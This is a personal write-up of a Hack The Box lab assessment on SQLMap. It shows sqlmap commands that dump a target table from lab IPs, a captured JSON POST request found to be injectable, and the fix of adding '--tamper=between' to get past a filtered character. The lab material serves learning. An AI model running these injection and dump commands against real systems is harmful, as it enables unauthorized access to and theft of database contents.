---
title: HTB - SQLMap Essentials - Skills Assesment
draft: 
tags:
---
# HTB - SQLMap Essentials - Skills Assessment

For this assessment we have one question "What is the contents of table final_flag"

To start, first lets see what we are working against?
![[Screenshot 2025-03-14 at 11.08.13 AM.png]]

As we can see we have a complex store page where it has multiple paths to call the database.

We have the following possibilities:
- shop
- blog
- cart

I believe in starting simple so lets go ahead and run the following script against each

```bash
sqlmap -u "http://94.237.54.116:46352/shop.html" --threads 10 --dump -T final_flag --batch
```

this yielded nothing of value. Instead of getting a quick win I decided to spend some time using burp to proxy requests in the most prominent areas.

To my surprise the first one I tried (adding something to my cart) gave a suspitious post request.

```
POST /action.php HTTP/1.1
Host: 94.237.59.30:47396
Content-Length: 8
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://94.237.59.30:47396
Referer: http://94.237.59.30:47396/shop.html
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

{"id":1}
``` 

the red herring is the JSON formated ID

I decided to run a simple scan on it to see if I get any errors to guide me

```bash
sqlmap -r test1.txt --dump -T final_flag --threads 10 --batch 
```

nothing appeared.

Now.. Future me... let me tell you a story of a very dumb me. I went and I tried different things. MANY DIFFERENT TIME CONSUMING THINGS SIMPLY BECAUSE I DID NOT READ THE DAMN OUTPUT THAT WERE WARNINGS.

I spent an hour and then took a break and came back. I checked other parts but this was clearly the only area that had a vulnerability. So I went back and tried that basic script over again. AND DO YOU KNOW WHAT I SAW IN THE WARNINGS?!?!?!?!

```
[21:34:35] [WARNING] it appears that the character '>' is filtered by the back-end server. You are strongly advised to rerun with the '--tamper=between'
```

in tech, you should read the logs, these are logs, read the output, even if you feel lazy.... READ THE OUTPUT

now lets see what I get from tacking on `--tamper=between`

oh wow the flag... and even it mocks me

![[9ng922.jpg]]